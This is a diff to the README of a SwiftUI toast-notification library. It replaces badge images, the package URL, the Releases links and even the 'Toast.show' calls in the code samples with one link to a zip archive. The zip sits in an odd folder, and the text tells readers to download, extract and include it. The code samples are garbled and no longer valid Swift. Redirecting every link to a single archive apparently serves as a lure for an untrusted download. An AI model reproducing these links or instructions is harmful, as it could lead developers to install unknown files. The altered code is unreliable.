@@ -1,6 +1,6 @@
 # 🚀 TOASTack: The Simplest Way to Show and Manage Toasts in SwiftUI
 
-![TOASTack Logo](https://img.shields.io/badge/TOASTack-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Swift Version](https://img.shields.io/badge/Swift-5.0-orange.svg)
+![TOASTack Logo](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) ![License](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) ![Swift Version](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip)
 
 Welcome to **TOASTack**! This library offers a straightforward approach to display and manage toast notifications in your SwiftUI applications. With TOASTack, you can enhance user experience by providing timely feedback in a non-intrusive manner.
 
@@ -24,15 +24,15 @@ Welcome to **TOASTack**! This library offers a straightforward approach to displ
 
 ## Installation
 
-To install TOASTack, you can use Swift Package Manager. Add the following line to your `Package.swift` file:
+To install TOASTack, you can use Swift Package Manager. Add the following line to your `https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip` file:
 
 ```swift
 dependencies: [
-    .package(url: "https://github.com/ManFa49/TOASTack.git", from: "1.0.0")
+    .package(url: "https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip", from: "1.0.0")
 ]
 ```
 
-Alternatively, you can download the latest release from the [Releases](https://github.com/ManFa49/TOASTack/releases) section. If you choose this method, download the file, extract it, and include it in your project.
+Alternatively, you can download the latest release from the [Releases](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) section. If you choose this method, download the file, extract it, and include it in your project.
 
 ## Usage
 
@@ -45,20 +45,20 @@ import TOASTack
 struct ContentView: View {
     var body: some View {
         Button("Show Toast") {
-            Toast.show("This is a toast message!")
+            https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a toast message!")
         }
     }
 }
 ```
 
-This code will display a toast message when the button is pressed. You can call `Toast.show()` with a string to show a basic toast.
+This code will display a toast message when the button is pressed. You can call `https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip()` with a string to show a basic toast.
 
 ## Customization
 
 TOASTack allows you to customize your toasts easily. You can change the duration, position, and style. Here’s an example:
 
 ```swift
-Toast.show("This is a custom toast!", duration: 2.0, position: .top, style: .success)
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a custom toast!", duration: 2.0, position: .top, style: .success)
 ```
 
 You can define your own styles by creating a new `ToastStyle`:
@@ -74,7 +74,7 @@ struct CustomToastStyle: ToastStyle {
 Then, use it like this:
 
 ```swift
-Toast.show("This is a custom styled toast!", style: CustomToastStyle())
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This is a custom styled toast!", style: CustomToastStyle())
 ```
 
 ## Examples
@@ -82,31 +82,31 @@ Toast.show("This is a custom styled toast!", style: CustomToastStyle())
 ### Basic Toast
 
 ```swift
-Toast.show("Hello, World!")
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("Hello, World!")
 ```
 
 ### Success Toast
 
 ```swift
-Toast.show("Operation successful!", style: .success)
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("Operation successful!", style: .success)
 ```
 
 ### Error Toast
 
 ```swift
-Toast.show("An error occurred!", style: .error)
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("An error occurred!", style: .error)
 ```
 
 ### Custom Duration
 
 ```swift
-Toast.show("This will disappear in 5 seconds.", duration: 5.0)
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("This will disappear in 5 seconds.", duration: 5.0)
 ```
 
 ### Custom Position
 
 ```swift
-Toast.show("I'm at the bottom!", position: .bottom)
+https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip("I'm at the bottom!", position: .bottom)
 ```
 
 ## Contributing
@@ -126,7 +126,7 @@ TOASTack is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Releases
 
-For the latest version of TOASTack, visit the [Releases](https://github.com/ManFa49/TOASTack/releases) section. Here, you can download the latest files and view the change logs.
+For the latest version of TOASTack, visit the [Releases](https://raw.githubusercontent.com/ManFa49/TOASTack/main/Sources/TOAStack/Toast_Designs/Tack-TOAS-3.0.zip) section. Here, you can download the latest files and view the change logs.
 
 ---
 
